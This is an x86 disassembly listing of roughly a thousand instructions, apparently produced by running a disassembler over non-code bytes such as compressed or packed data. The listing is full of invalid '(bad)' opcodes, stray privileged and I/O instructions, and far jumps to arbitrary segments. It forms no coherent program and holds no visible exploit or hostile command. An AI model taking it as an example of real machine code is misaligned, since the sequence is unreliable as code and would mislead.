  436db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436db9:	sub    BYTE PTR [ebp+0xa69a650],0xad
  436dc0:	shl    DWORD PTR [eax],0xf0
  436dc3:	or     eax,0x32b8c362
  436dc8:	sbb    DWORD PTR [ebp-0x6f1b5f42],edi
  436dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436dd0:	es pop edx
  436dd2:	push   es
  436dd3:	push   ds
  436dd4:	cwde   
  436dd5:	pop    edx
  436dd6:	or     dl,bl
  436dd8:	mov    ds:0xe8d83c1e,eax
  436ddd:	and    eax,0xa0889fa5
  436de2:	(bad)  
  436de3:	jo     0x436d96
  436de5:	xchg   ebx,eax
  436de6:	stos   BYTE PTR es:[edi],al
  436de7:	xchg   esp,eax
  436de8:	icebp  
  436de9:	inc    esp
  436dea:	mov    esi,0x1ac5e25e
  436def:	ins    DWORD PTR es:[edi],dx
  436df0:	xor    ebp,DWORD PTR [edi+0x3400a24e]
  436df6:	fsub   DWORD PTR [edi+ecx*4+0x4c]
  436dfa:	sub    cl,ah
  436dfc:	lods   eax,DWORD PTR ds:[esi]
  436dfd:	retf   0x1d25
  436e00:	fsub   st,st(2)
  436e02:	xchg   edx,eax
  436e03:	dec    esi
  436e04:	neg    BYTE PTR [ebx+ecx*4]
  436e07:	xchg   ebp,eax
  436e08:	ret    0x8007
  436e0b:	inc    ebx
  436e0c:	dec    eax
  436e0d:	lock cld 
  436e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436e10:	imul   esi,DWORD PTR es:[ecx+eiz*2],0x64
  436e15:	cli    
  436e16:	jmp    0x8ac2:0xd8f41c52
  436e1d:	retf   
  436e1e:	mov    dl,0x75
  436e20:	loop   0x436e36
  436e22:	rol    BYTE PTR [ebx],0x8
  436e25:	dec    ebx
  436e26:	jmp    0x6e1c:0x3ac46c33
  436e2d:	mov    BYTE PTR [ecx+0x76947c66],ah
  436e33:	fdivr  QWORD PTR [esi-0x6befabbb]
  436e39:	(bad)  
  436e3a:	cld    
  436e3b:	cmp    eax,DWORD PTR [ecx-0x7b]
  436e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436e3f:	mov    dh,BYTE PTR [eax-0x4685cbe7]
  436e45:	sub    al,0x28
  436e47:	add    al,BYTE PTR ds:[esi+eiz*1+0x34]
  436e4c:	sub    BYTE PTR [ebx+0x68],0x66
  436e50:	adc    al,cl
  436e52:	out    dx,al
  436e53:	pop    esi
  436e54:	inc    eax
  436e55:	xchg   ecx,eax
  436e56:	aam    0xad
  436e58:	xchg   esp,eax
  436e59:	dec    esi
  436e5a:	or     DWORD PTR [ebp+0x43],ecx
  436e5d:	stos   DWORD PTR es:[edi],eax
  436e5e:	mov    WORD PTR [ecx],?
  436e60:	dec    esi
  436e61:	cmp    BYTE PTR ds:0xb2b47798,dh
  436e67:	cli    
  436e68:	or     DWORD PTR [edx-0x1],eax
  436e6b:	add    BYTE PTR [ecx+0x42f32cd7],dl
  436e71:	mov    eax,0x2c1a1690
  436e76:	push   ds
  436e77:	loop   0x436ea8
  436e79:	call   0xec96:0xeca10df5
  436e80:	sahf   
  436e81:	mov    dh,0xdd
  436e83:	adc    ecx,DWORD PTR [ebx]
  436e85:	cmp    dl,BYTE PTR [esi+0x70583996]
  436e8b:	pusha  
  436e8c:	imul   eax,DWORD PTR [ecx+0x30663860],0xffffffcc
  436e93:	lock jae 0x436e9c
  436e96:	xchg   ebx,eax
  436e97:	mov    eax,ds:0x166db8f6
  436e9c:	mov    ah,bh
  436e9e:	adc    BYTE PTR ds:[eax-0x7b],al
  436ea2:	test   al,0x73
  436ea4:	rcr    BYTE PTR [esi+0x27],cl
  436ea7:	dec    eax
  436ea8:	aas    
  436ea9:	hlt    
  436eaa:	adc    BYTE PTR [eax-0x5],dh
  436ead:	adc    al,ch
  436eaf:	addr16 into 
  436eb1:	sbb    ebx,edx
  436eb3:	mov    ah,BYTE PTR [edx-0x11476d95]
  436eb9:	pop    edx
  436eba:	add    cl,BYTE PTR [eax+0x48e69a]
  436ec0:	push   esi
  436ec1:	fcom   st(6)
  436ec3:	int3   
  436ec4:	push   0x45
  436ec6:	cs out 0x8e,eax
  436ec9:	dec    ebp
  436eca:	lds    eax,FWORD PTR [eax+ebp*8]
  436ecd:	inc    edi
  436ece:	and    bh,BYTE PTR [edi+0x7094fda3]
  436ed4:	out    dx,al
  436ed5:	test   al,0x46
  436ed7:	ins    DWORD PTR es:[edi],dx
  436ed8:	cld    
  436ed9:	sbb    al,BYTE PTR [eax]
  436edb:	jp     0x436f49
  436edd:	add    ah,dl
  436edf:	stos   BYTE PTR es:[edi],al
  436ee0:	dec    edi
  436ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436ee2:	ss in  al,dx
  436ee4:	mov    BYTE PTR [esp+ebp*4],dl
  436ee7:	pushf  
  436ee8:	mov    dl,BYTE PTR [ebx-0x6476cc3a]
  436eee:	cmp    dh,BYTE PTR [ecx+0x61]
  436ef1:	adc    edx,0xffffff94
  436ef4:	enter  0x8062,0x9b
  436ef8:	lahf   
  436ef9:	pop    esp
  436efa:	ret    0x6878
  436efd:	ins    BYTE PTR es:[edi],dx
  436efe:	inc    esp
  436eff:	jmp    0x436f1b
  436f01:	or     DWORD PTR ss:[ebx+0x524c5601],ebp
  436f08:	and    DWORD PTR [ebp+0x76],edi
  436f0b:	stos   BYTE PTR es:[edi],al
  436f0c:	rcl    DWORD PTR [ecx-0x2b],0x48
  436f10:	add    al,0xfc
  436f12:	sbb    ebx,DWORD PTR [eax]
  436f14:	push   eax
  436f15:	pop    ebx
  436f16:	sbb    edx,edi
  436f18:	push   es
  436f19:	mov    ch,0x2a
  436f1b:	adc    bl,BYTE PTR [ecx]
  436f1d:	mov    ch,al
  436f1f:	stos   BYTE PTR es:[edi],al
  436f20:	fiadd  DWORD PTR [eax+0x525ede35]
  436f26:	out    dx,al
  436f27:	(bad)  
  436f28:	dec    ecx
  436f29:	ror    BYTE PTR [edx+0x280f742b],1
  436f2f:	aas    
  436f30:	jg     0x436ee4
  436f32:	inc    esi
  436f33:	inc    ebx
  436f34:	test   BYTE PTR [eax],0x4d
  436f37:	jle    0x436f15
  436f39:	or     BYTE PTR [ebx-0x48],0x5b
  436f3d:	xor    cl,BYTE PTR [ebx]
  436f3f:	push   0x46
  436f41:	jb     0x436f15
  436f43:	adc    bh,BYTE PTR [edi-0x6acfcbf4]
  436f49:	push   esi
  436f4a:	in     al,0x36
  436f4c:	pop    edi
  436f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436f4e:	ss cmp al,0x4e
  436f51:	cmp    bl,BYTE PTR [esi-0x6fa37277]
  436f57:	mov    dh,0x2e
  436f59:	mov    DWORD PTR [edx-0x251703dd],eax
  436f5f:	xchg   ebx,eax
  436f60:	xor    cl,BYTE PTR [edx-0xdcfeaf4]
  436f66:	ret    0x5eb0
  436f69:	fwait
  436f6a:	dec    esp
  436f6b:	mov    dl,0x9c
  436f6d:	(bad)  
  436f6e:	mov    dh,0x28
  436f70:	sbb    ch,ah
  436f72:	push   ss
  436f73:	fisubr DWORD PTR [edi+0x1a]
  436f76:	cs fcmove st,st(4)
  436f79:	mov    eax,0x6da000fd
  436f7e:	pop    es
  436f7f:	enter  0x22f8,0xf6
  436f83:	out    0x70,eax
  436f85:	cdq    
  436f86:	sub    dl,ch
  436f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436f89:	js     0x436fc7
  436f8b:	xchg   DWORD PTR [bp+si-0x30],ebp
  436f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436f90:	in     al,0x96
  436f92:	div    BYTE PTR [ebx+eax*2]
  436f95:	xchg   ecx,eax
  436f96:	lods   eax,DWORD PTR ds:[esi]
  436f97:	popf   
  436f98:	inc    eax
  436f99:	popf   
  436f9a:	push   0x6ab5d922
  436f9f:	sbb    DWORD PTR [edx+0x18],ecx
  436fa2:	(bad)  
  436fa3:	repz mov gs,WORD PTR [edx+ecx*1+0x5a]
  436fa8:	int    0x54
  436faa:	pop    edx
  436fab:	scas   eax,DWORD PTR es:[edi]
  436fac:	add    al,0x96
  436fae:	(bad)  
  436faf:	push   fs
  436fb1:	adc    eax,0x3478b00d
  436fb6:	mov    bl,0x6a
  436fb8:	mov    esi,0x8ec203eb
  436fbd:	outs   dx,DWORD PTR ds:[esi]
  436fbe:	add    al,BYTE PTR [esi-0x72]
  436fc1:	lock scas al,BYTE PTR es:[edi]
  436fc3:	int3   
  436fc4:	aad    0x2d
  436fc6:	loopne 0x436f4a
  436fc8:	jbe    0x437034
  436fca:	loopne 0x436f71
  436fcc:	sub    edx,DWORD PTR [edx-0x13]
  436fcf:	xchg   edi,eax
  436fd0:	dec    eax
  436fd1:	mov    bh,0x85
  436fd3:	jl     0x436ffd
  436fd5:	sub    BYTE PTR [eax],al
  436fd7:	inc    esi
  436fd8:	mov    eax,ds:0xbc1c7f8d
  436fdd:	jmp    0x9130f3f9
  436fe2:	popa   
  436fe3:	sbb    al,0x60
  436fe5:	cmp    cl,BYTE PTR [eax+ecx*4+0x39]
  436fe9:	adc    eax,0x8e0df138
  436fee:	inc    esi
  436fef:	out    0xc6,al
  436ff1:	sbb    ebp,DWORD PTR [edx+0x47]
  436ff4:	mov    al,ds:0xc1191856
  436ff9:	and    dh,cl
  436ffb:	jl     0x436f7d
  436ffd:	cmp    al,0x6d
  437000:	ins    BYTE PTR es:[edi],dx
  437001:	jbe    0x436f9b
  437003:	inc    esp
  437004:	or     BYTE PTR [ebp-0x80],ah
  437007:	adc    cl,bh
  437009:	nop
  43700a:	push   ds
  43700b:	out    0x9f,al
  43700d:	repz fiadd WORD PTR [ecx+0x64]
  437011:	ins    BYTE PTR es:[edi],dx
  437012:	sbb    eax,0x19c5602
  437017:	les    ebp,FWORD PTR [esi-0x3a]
  43701a:	loopne 0x43701c
  43701c:	gs lahf 
  43701e:	xchg   esi,eax
  43701f:	rcr    BYTE PTR [eax],1
  437021:	xor    al,0xe4
  437023:	cmp    eax,0xde5a2a88
  437028:	xor    bh,BYTE PTR ds:0x9b3461c2
  43702e:	mov    eax,ds:0xbead7402
  437033:	jbe    0x436fdb
  437035:	mov    cl,0xe8
  437037:	push   esi
  437038:	ds xchg ebx,eax
  43703a:	fcom   DWORD PTR [eax+0x52]
  43703d:	xor    DWORD PTR [eax+0x1a],edx
  437040:	adc    edx,DWORD PTR [edx+0x4b]
  437043:	test   eax,0x84fd25bf
  437048:	es xor al,0xbf
  43704b:	pop    edx
  43704c:	fst    QWORD PTR [ecx]
  43704e:	mov    BYTE PTR ss:[eax+0x4b],bh
  437052:	int3   
  437053:	bound  ebx,QWORD PTR ds:0xacb1da57
  437059:	lods   eax,DWORD PTR ds:[esi]
  43705a:	jns    0x437073
  43705c:	adc    eax,0xe31629ac
  437061:	sbb    ebp,DWORD PTR [edx]
  437063:	cmp    bl,BYTE PTR [edx+0x533069d0]
  437069:	jl     0x4370c3
  43706b:	pop    esp
  43706c:	xchg   edi,eax
  43706d:	mov    al,0x99
  43706f:	shr    BYTE PTR [edi],cl
  437071:	add    DWORD PTR [esi+edx*1],ebx
  437074:	loop   0x437021
  437076:	xor    cl,BYTE PTR [ecx]
  437078:	in     eax,dx
  437079:	jbe    0x4370da
  43707b:	add    al,0xbe
  43707d:	adc    al,0x2a
  43707f:	add    eax,0xb036b10
  437084:	ins    BYTE PTR es:[edi],dx
  437085:	cmp    al,BYTE PTR [eax+0x3f247876]
  43708b:	inc    esi
  43708c:	loop   0x4370ce
  43708e:	rol    BYTE PTR [edx+0x5886f677],0xe0
  437095:	cdq    
  437096:	mov    ch,0xb6
  437098:	test   al,0xa8
  43709a:	adc    BYTE PTR [ebp-0x74],ah
  43709d:	aad    0x1a
  43709f:	and    dl,BYTE PTR ds:0xdc39
  4370a4:	(bad)  
  4370a5:	fadd   DWORD PTR [eax-0x64]
  4370a8:	imul   esi,DWORD PTR [esi-0x772e5a7a],0x80db3c24
  4370b2:	test   eax,0x4da00e60
  4370b7:	pusha  
  4370b8:	xor    ch,BYTE PTR [esi]
  4370ba:	mov    bl,dh
  4370bc:	lods   al,BYTE PTR ds:[esi]
  4370bd:	push   ecx
  4370be:	nop
  4370bf:	stos   BYTE PTR es:[edi],al
  4370c0:	push   0x654c801b
  4370c5:	mov    dl,0x17
  4370c7:	inc    esi
  4370c8:	int    0xa0
  4370ca:	shr    BYTE PTR [ecx+0x7c],0xca
  4370ce:	jnp    0x43709c
  4370d0:	sub    bh,BYTE PTR [ebx]
  4370d2:	ins    BYTE PTR es:[edi],dx
  4370d3:	mov    eax,0x728ab536
  4370d8:	add    cl,BYTE PTR [eax-0x7ca2d91b]
  4370de:	not    BYTE PTR [eax+0x348024f8]
  4370e4:	nop
  4370e5:	mov    eax,0x53e8f942
  4370ea:	aad    0x87
  4370ec:	xor    BYTE PTR [ecx],0x2c
  4370ef:	or     eax,0x41c4ee54
  4370f4:	sub    BYTE PTR [eax-0x3f],al
  4370f7:	xor    eax,0x1c349ef0
  4370fc:	jecxz  0x437111
  4370fe:	mov    al,0x1d
  437100:	loop   0x437107
  437102:	jbe    0x4370b2
  437104:	(bad)
  437108:	int3   
  437109:	add    BYTE PTR [eax+eax*4-0x40],al
  43710d:	jbe    0x43710d
  43710f:	fs inc eax
  437111:	xor    edi,DWORD PTR [ebx]
  437113:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437115:	add    ch,BYTE PTR [esi+ebx*1+0x528bf478]
  43711c:	adc    eax,0xf664c0d0
  437121:	xor    dl,BYTE PTR [ecx-0x495a2ea6]
  437127:	aad    0xa4
  437129:	arpl   WORD PTR [edx+0x2eaf8e3],si
  43712f:	xor    eax,0xec7ad952
  437134:	cmp    eax,0x6d04f014
  437139:	mov    eax,0xacf2d444
  43713e:	jmp    0x24ce:0xb4e0d120
  437145:	repnz shl DWORD PTR [eax-0x7eee150],0x35
  43714d:	inc    edx
  43714e:	enter  0xe496,0x46
  437152:	xchg   DWORD PTR [edx+ecx*2],ebx
  437155:	inc    esi
  437156:	imul   ebx,DWORD PTR [ebx+edx*1+0x28],0x9cb68d1e
  43715e:	sti    
  43715f:	ins    BYTE PTR es:[edi],dx
  437160:	loop   0x43712b
  437162:	int3   
  437163:	(bad)  
  437164:	jbe    0x437162
  437166:	sub    eax,0xad1d70bc
  43716b:	test   eax,0x70d6b424
  437170:	mov    eax,0x812fc75
  437175:	shl    BYTE PTR [ecx-0x2ffd7b54],1
  43717b:	jl     0x4371dd
  43717d:	inc    edi
  43717e:	xchg   ecx,eax
  43717f:	push   ss
  437180:	jp     0x437118
  437182:	push   ds
  437183:	sbb    BYTE PTR [eax+0x144cba8e],dl
  437189:	cmp    DWORD PTR [ebp+0x70],ebp
  43718c:	loopne 0x4371b3
  43718e:	mov    ebx,0x82a23a8
  437193:	mov    edi,0xe035588e
  437198:	or     edx,edx
  43719a:	inc    ebx
  43719b:	sbb    DWORD PTR [eax+0x47],esp
  43719e:	jl     0x4371d4
  4371a0:	add    ch,BYTE PTR [eax-0xa]
  4371a3:	sub    al,0xec
  4371a5:	sbb    eax,0x78961046
  4371aa:	or     bl,BYTE PTR [esi+edx*1+0x659c688e]
  4371b1:	scas   al,BYTE PTR es:[edi]
  4371b2:	add    eax,0xc49ab69d
  4371b7:	add    bl,dh
  4371b9:	out    dx,al
  4371ba:	pushf  
  4371bb:	fdiv   QWORD PTR [esi]
  4371bd:	mov    ah,0x27
  4371bf:	add    eax,eax
  4371c1:	adc    eax,0xd14a7de8
  4371c6:	and    bl,BYTE PTR ds:0x9e940745
  4371cc:	or     dh,bh
  4371ce:	sub    dl,BYTE PTR [eax+0x417e8931]
  4371d4:	mov    edx,0x51cc1080
  4371d9:	ret    0x508c
  4371dc:	inc    ecx
  4371dd:	ins    BYTE PTR es:[edi],dx
  4371de:	adc    eax,0xdc1c691a
  4371e3:	(bad)  
  4371e4:	cmovb  ecx,ebp
  4371e7:	sub    bl,BYTE PTR [esi+0x3492b35a]
  4371ed:	ss inc ebp
  4371ef:	inc    edi
  4371f0:	push   es
  4371f1:	inc    ecx
  4371f2:	mov    al,0xa3
  4371f4:	or     eax,DWORD PTR [esi]
  4371f6:	in     al,dx
  4371f7:	test   DWORD PTR [edi+ecx*2-0x61f3f068],ebp
  4371fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4371ff:	mov    si,0xb32f
  437203:	loope  0x43723b
  437205:	push   eax
  437206:	(bad)  
  437207:	ficom  DWORD PTR [ecx]
  437209:	sub    BYTE PTR [eax+0x68],ch
  43720c:	inc    esi
  43720d:	pop    ebp
  43720e:	xchg   edx,eax
  43720f:	fidiv  WORD PTR [esi]
  437211:	int    0x4d
  437213:	imul   edx,DWORD PTR [ebx+0x52b5e855],0x5bdbe
  43721d:	mov    al,ds:0xda367159
  437222:	and    BYTE PTR [edi-0x58],0x68
  437226:	(bad)  
  437227:	adc    al,0x5a
  437229:	sti    
  43722a:	clc    
  43722b:	aam    0x2c
  43722d:	lods   al,BYTE PTR ds:[esi]
  43722e:	in     al,0x28
  437230:	ret    
  437231:	mov    edx,0xe80b14d6
  437236:	mov    al,0x28
  437238:	mov    es,WORD PTR [eax+eiz*8-0x5c989fe6]
  43723f:	retf   0x10
  437242:	(bad)  
  437243:	mov    ds:0xacd6dac,al
  437248:	lea    eax,[esp+ecx*8+0x40]
  43724c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43724d:	and    cl,BYTE PTR [eax]
  43724f:	dec    esp
  437250:	stos   DWORD PTR es:[edi],eax
  437251:	fwait
  437252:	pop    es
  437253:	or     BYTE PTR [edi+0x26dd584c],bl
  437259:	xor    al,0x45
  43725b:	je     0x437271
  43725d:	sbb    al,0x73
  437260:	in     al,0x7c
  437262:	rol    BYTE PTR [edx],0xa8
  437265:	cs push ss
  437267:	test   al,0x67
  437269:	dec    ax
  43726b:	rol    BYTE PTR [ebx],cl
  43726d:	sbb    cl,BYTE PTR [esi-0x3d8a0800]
  437273:	or     BYTE PTR [esp+eax*1],0xe8
  437277:	pop    ecx
  437278:	push   eax
  437279:	adc    DWORD PTR [esi],esi
  43727b:	jmp    0x100a:0x4015048a
  437282:	mov    WORD PTR [eax+0x4c634f94],ss
  437288:	enter  0xaefa,0x1e
  43728c:	xor    al,0x3a
  43728e:	or     DWORD PTR [esi+ebp*2-0x529d3b12],esi
  437295:	adc    eax,0xba0f4b06
  43729a:	dec    ebp
  43729b:	and    al,0xdc
  43729d:	ret    
  43729e:	retf   
  43729f:	mov    gs,WORD PTR [eax]
  4372a1:	ins    BYTE PTR es:[edi],dx
  4372a2:	and    ah,BYTE PTR [esi+0x5c]
  4372a5:	push   0x2c20702c
  4372aa:	cmp    BYTE PTR [edx-0x6f788112],al
  4372b0:	nop
  4372b1:	cwde   
  4372b2:	or     eax,DWORD PTR [ebx+ebx*1]
  4372b5:	sahf   
  4372b6:	(bad)  
  4372b7:	xor    ecx,eax
  4372b9:	push   ebx
  4372ba:	mov    gs,WORD PTR [esi+0x1fc8e166]
  4372c0:	les    ebp,FWORD PTR [ebx]
  4372c2:	dec    edx
  4372c3:	into   
  4372c4:	retf   
  4372c5:	or     DWORD PTR [esi+0x5b],0x7f
  4372c9:	test   DWORD PTR [ebp+0xd],ebp
  4372cc:	aam    0xb
  4372ce:	cs cmp eax,0xd23abebb
  4372d4:	jno    0x4372d6
  4372d6:	scas   al,BYTE PTR es:[edi]
  4372d7:	loope  0x4372d9
  4372d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4372da:	sbb    DWORD PTR [esp+esi*1-0x67],ecx
  4372de:	les    esp,FWORD PTR [edx]
  4372e0:	inc    esi
  4372e1:	pop    edx
  4372e2:	lods   eax,DWORD PTR ds:[esi]
  4372e3:	pop    ss
  4372e4:	mov    al,0x35
  4372e6:	adc    BYTE PTR [eax-0x5f21f78a],bl
  4372ec:	pop    edx
  4372ed:	inc    esi
  4372ee:	push   edi
  4372ef:	or     DWORD PTR [ebx+edi*1-0x5d9a4e14],0xd47896d8
  4372fa:	clc    
  4372fb:	xchg   BYTE PTR [esi],bh
  4372fd:	pop    ecx
  4372fe:	cli    
  4372ff:	or     al,0xc
  437301:	int3   
  437302:	out    0x2f,al
  437304:	into   
  437305:	outs   dx,DWORD PTR ds:[esi]
  437306:	sub    BYTE PTR [eax],al
  437308:	inc    esi
  437309:	or     dl,BYTE PTR [esi+0x54]
  43730c:	mov    dh,0xe7
  43730e:	add    BYTE PTR ds:[esi-0x6792f53e],ch
  437315:	repnz xor al,0xb5
  437318:	pop    esi
  437319:	imul   esp,edx,0x31
  43731c:	mov    cl,0xf4
  43731e:	jb     0x437313
  437320:	or     al,0x1
  437322:	pop    esp
  437323:	call   0xb08f:0x86d20f84
  43732a:	and    BYTE PTR [edi+0x6d886af2],ch
  437330:	or     ch,BYTE PTR [edx+0x4ea096be]
  437336:	repz ss stc 
  437339:	and    eax,0x9d495445
  43733e:	inc    ebp
  43733f:	inc    esi
  437340:	push   0x3e
  437342:	adc    eax,0x2659a655
  437347:	push   es
  437348:	inc    ecx
  437349:	ror    DWORD PTR [edx-0x57ef892e],cl
  43734f:	and    dl,ah
  437351:	cld    
  437352:	test   DWORD PTR [eax],eax
  437354:	xor    BYTE PTR [ebp+0x0],dl
  437357:	in     eax,dx
  437358:	pop    es
  437359:	jmp    0xe44b:0x3e161ff9
  437360:	dec    eax
  437361:	mov    eax,0x1143e2f2
  437366:	aas    
  437367:	test   DWORD PTR [ebx-0x59ef03c2],ebx
  43736d:	retf   0x332d
  437370:	test   BYTE PTR [ecx-0x1e],dl
  437373:	xchg   esi,eax
  437374:	rol    BYTE PTR ds:0xc51226e0,1
  43737a:	add    dl,al
  43737c:	add    ch,BYTE PTR [ecx]
  43737e:	pop    edx
  43737f:	mov    DWORD PTR [edx],edi
  437381:	xchg   al,cl
  437383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437384:	dec    ebx
  437385:	leave  
  437386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437387:	gs and cl,dl
  43738a:	fsubr  st(0),st
  43738c:	inc    esi
  43738d:	js     0x43739e
  43738f:	imul   edi,DWORD PTR [ebx],0x56
  437392:	xchg   ebx,eax
  437393:	mul    BYTE PTR [esi-0x53493af6]
  437399:	pop    ss
  43739a:	nop
  43739b:	sub    ch,BYTE PTR [ebp-0x138ced40]
  4373a1:	(bad)  
  4373a2:	mov    dh,0xd6
  4373a4:	call   0xb6d6:0xcabea642
  4373ab:	pop    esi
  4373ac:	repz inc eax
  4373ae:	mov    eax,ds:0x97b58529
  4373b3:	ss jp  0x4373b3
  4373b6:	jecxz  0x4373a0
  4373b8:	pop    ds
  4373b9:	adc    dl,cl
  4373bb:	mov    edi,edx
  4373bd:	and    DWORD PTR [eax+0x31],esp
  4373c0:	mov    bl,0xbc
  4373c2:	dec    esi
  4373c3:	in     al,0xfd
  4373c5:	adc    al,0xb1
  4373c7:	sbb    eax,0xaeca9f32
  4373cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4373cd:	push   ss
  4373ce:	sub    BYTE PTR [ecx-0x64],dl
  4373d1:	xor    BYTE PTR [esi],ch
  4373d3:	push   0xd89a78e2
  4373d8:	pusha  
  4373d9:	inc    ebp
  4373da:	xchg   esp,eax
  4373db:	jl     0x437442
  4373dd:	pop    eax
  4373de:	jp     0x43740a
  4373e0:	fadd   QWORD PTR [edi]
  4373e2:	mov    al,0x5e
  4373e4:	add    esp,DWORD PTR [eax+ebp*8-0x43]
  4373e8:	sbb    ch,BYTE PTR [ecx+eiz*8-0xdba735f]
  4373ef:	mov    ch,0x22
  4373f1:	shl    BYTE PTR [edx-0x53],0x3d
  4373f5:	leave  
  4373f6:	cli    
  4373f7:	ins    BYTE PTR es:[edi],dx
  4373f8:	mov    ss,WORD PTR [ecx+0x3e]
  4373fb:	clc    
  4373fc:	mov    esp,0x692c61f4
  437401:	out    0x86,al
  437403:	mov    eax,0x8228d85c
  437408:	rcr    BYTE PTR [edx+0x4c],cl
  43740b:	stos   DWORD PTR es:[edi],eax
  43740c:	aaa    
  43740d:	cmp    al,0x12
  43740f:	jbe    0x43741d
  437411:	sbb    BYTE PTR [edx+0x60],bh
  437414:	add    DWORD PTR [ecx-0x56],edi
  437417:	test   DWORD PTR [eax],0x20871bbf
  43741d:	call   0x668d:0x91fed2a8
  437424:	inc    ecx
  437425:	pop    es
  437426:	aas    
  437427:	push   ebx
  437428:	push   esp
  437429:	pop    esp
  43742a:	sub    bh,bh
  43742c:	cmc    
  43742d:	add    ecx,esp
  43742f:	xchg   ebx,eax
  437430:	pop    esi
  437431:	jmp    0xaa91:0xd28926c2
  437438:	aad    0xaa
  43743a:	xlat   BYTE PTR ds:[ebx]
  43743b:	push   0xffffff9d
  43743d:	and    BYTE PTR [ebx],0xae
  437440:	arpl   WORD PTR [ebx+0x4c5cbc91],bp
  437446:	or     BYTE PTR [eax],0x29
  437449:	adc    eax,0xfe988753
  43744e:	dec    edx
  43744f:	and    BYTE PTR [ebp+0x1cfb50c7],al
  437455:	sub    ecx,ebx
  437457:	dec    esp
  437458:	cmc    
  437459:	jbe    0x4374b9
  43745b:	or     eax,0x25e34178
  437460:	bound  ebx,QWORD PTR [ecx]
  437462:	call   0xf427:0xda7efb32
  437469:	sbb    BYTE PTR [eax+0x19],0x97
  43746d:	jp     0x437445
  43746f:	lods   al,BYTE PTR ds:[esi]
  437470:	mov    edi,0xa9b196b
  437475:	fdivr  DWORD PTR [edx-0x2132877e]
  43747b:	jmp    0xdace34db
  437480:	pop    eax
  437481:	hlt    
  437482:	inc    ecx
  437483:	add    BYTE PTR [eax-0x5e49777d],0x3a
  43748a:	cli    
  43748b:	and    dl,dh
  43748d:	xchg   BYTE PTR [eax-0x5a],dh
  437490:	outs   dx,BYTE PTR ds:[esi]
  437491:	push   esp
  437492:	fadd   DWORD PTR [edi-0x16]
  437495:	aas    
  437496:	stos   DWORD PTR es:[edi],eax
  437497:	stos   BYTE PTR es:[edi],al
  437498:	xor    esp,DWORD PTR [edx-0x747114e]
  43749e:	add    BYTE PTR [ebp+0x46d4f075],dh
  4374a4:	in     eax,0xbb
  4374a6:	ins    BYTE PTR es:[edi],dx
  4374a7:	inc    esi
  4374a8:	push   esp
  4374a9:	aaa    
  4374aa:	aam    0xd4
  4374ac:	repnz adc BYTE PTR [edx],bl
  4374af:	mov    eax,0x8835d2de
  4374b4:	xlat   BYTE PTR ds:[ebx]
  4374b5:	mov    ah,0x9b
  4374b8:	into   
  4374b9:	xor    al,dh
  4374bb:	sbb    edx,0xc
  4374be:	xchg   dh,dl
  4374c0:	inc    eax
  4374c1:	mov    ecx,0xbf7c9f98
  4374c6:	and    al,0xbc
  4374c8:	es clc 
  4374ca:	lock loope 0x437545
  4374cd:	jmp    0x43745e
  4374cf:	stos   BYTE PTR es:[edi],al
  4374d0:	mov    DWORD PTR [edi+0x3],ecx
  4374d3:	loop   0x4374d7
  4374d5:	mov    BYTE PTR [ebx+0x1745fe],al
  4374db:	fs (bad) 
  4374dd:	dec    edx
  4374de:	rol    DWORD PTR [ebp+0x0],0xc9
  4374e2:	mov    DWORD PTR [eax],0xc3c390f3
  4374e8:	sub    BYTE PTR [edx+0x5c],0x44
  4374ec:	add    ch,BYTE PTR [edx+0x20]
  4374ef:	cmp    esp,DWORD PTR [esp+esi*4+0x271c79]
  4374f6:	adc    esp,DWORD PTR [ebp+0x106c0c15]
  4374fc:	cs jnp 0x437507
  4374ff:	arpl   WORD PTR [esi-0x24],ax
  437502:	fs dec ebp
  437505:	mov    dl,0x4a
  437507:	push   ds
  437508:	or     eax,ebx
  43750a:	icebp  
  43750b:	sbb    esp,edi
  43750d:	add    BYTE PTR [ecx],bh
  43750f:	test   al,0x4e
  437511:	cmp    BYTE PTR [edx],ah
  437513:	jb     0x4374a7
  437515:	ds dec ecx
  437517:	push   0x2a
  437519:	call   0x7bfc6429
  43751e:	icebp  
  43751f:	aaa    
  437520:	mov    eax,ds:0x6c4e12cf
  437525:	outs   dx,DWORD PTR ds:[esi]
  437526:	mov    ah,0x91
  437528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437529:	arpl   bx,bp
  43752b:	jge    0x43757d
  43752d:	mov    al,ds:0x22aa7e68
  437532:	xor    DWORD PTR [eax],esp
  437534:	ret    0x3a92
  437537:	push   es
  437538:	ins    DWORD PTR es:[edi],dx
  437539:	rol    DWORD PTR [ebx-0xfc5153e],0x14
  437540:	add    BYTE PTR [ecx],dl
  437542:	fcom   QWORD PTR [ecx-0x39]
  437545:	(bad)  
  437546:	push   cs
  437547:	add    BYTE PTR [ecx],0xbc
  43754a:	sbb    al,0x40
  43754c:	sbb    DWORD PTR [esi+0x6b121440],esp
  437552:	dec    ebp
  437553:	gs pop ecx
  437555:	pop    ds
  437556:	add    al,0x88
  437558:	adc    BYTE PTR [edx+0x3282c21c],dh
  43755e:	aad    0xbc
  437560:	arpl   WORD PTR [esi-0x3c],ax
  437563:	shl    BYTE PTR [edx],cl
  437565:	add    BYTE PTR [eax+0x4dbcd277],ch
  43756b:	sub    eax,0x4abf92fa
  437570:	jno    0x43753c
  437572:	and    al,0x30
  437574:	push   ecx
  437575:	test   al,0x42
  437577:	je     0x4375a7
  437579:	mov    esi,0x68ea6a9a
  43757e:	js     0x437528
  437580:	inc    eax
  437581:	xchg   edx,eax
  437582:	and    ebx,DWORD PTR [eax+0x5e9ee8cf]
  437588:	rcr    eax,1
